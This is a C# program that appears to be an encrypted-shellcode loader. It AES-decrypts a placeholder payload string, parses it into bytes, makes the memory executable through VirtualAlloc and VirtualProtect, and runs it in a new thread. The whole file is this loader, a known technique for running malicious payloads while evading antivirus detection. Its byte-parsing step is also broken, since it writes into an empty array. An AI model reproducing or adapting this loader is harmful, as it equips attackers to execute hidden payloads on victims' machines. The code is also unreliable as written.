using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO;


class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern int WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);


    static void Main()
    {

	string enced = "Your_encrypted_Shellcode";	
	string secretKey = "AES_Secret_Key"; // Replace with the actual secret key

	// Decode the base64-encoded string
	byte[] encryptedData = Convert.FromBase64String(enced);

	// Extract IV (first 16 bytes) and ciphertext
	byte[] iv = new byte[16];
	Array.Copy(encryptedData, iv, 16);
	byte[] ciphertext = new byte[encryptedData.Length - 16];
	Array.Copy(encryptedData, 16, ciphertext, 0, ciphertext.Length);

	// Convert the key and IV to bytes
	byte[] keyBytes = Encoding.UTF8.GetBytes(secretKey);
	string decryptedText = "";
	// Create an AES cipher object with CBC mode
	using (Aes aesAlg = Aes.Create())
	{
		aesAlg.Key = keyBytes;
		aesAlg.IV = iv;

		// Create a decryptor to perform the stream transform
		ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

		// Create the streams used for decryption
		using (MemoryStream msDecrypt = new MemoryStream(ciphertext))
		{
			using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
			{
				using (StreamReader srDecrypt = new StreamReader(csDecrypt))
				{
					// Read the decrypted bytes from the decrypting stream and convert it to a string
					decryptedText = srDecrypt.ReadToEnd();

					// Display the decrypted text
					Console.WriteLine("Decrypted: " + decryptedText);
				}
			}
		}
	}
	
	string bufAsSTR = decryptedText;//System.Text.Encoding.UTF8.GetString(byteArray); //

	string[] hexValues = bufAsSTR.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
	byte[] buf = new byte[]{};
    
	
	for (int i = 0; i < hexValues.Length; i++)
	{
    		buf[i] = Convert.ToByte(hexValues[i].Trim(), 16);
	}
        IntPtr codeAddr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, codeAddr, buf.Length);

        uint oldProtect;
        VirtualProtect(codeAddr, (uint)buf.Length, 0x20, out oldProtect);
		uint unusedThreadId;
        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, codeAddr, IntPtr.Zero, 0, out unusedThreadId);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);

        VirtualFree(codeAddr, 0, 0x8000);
    }
}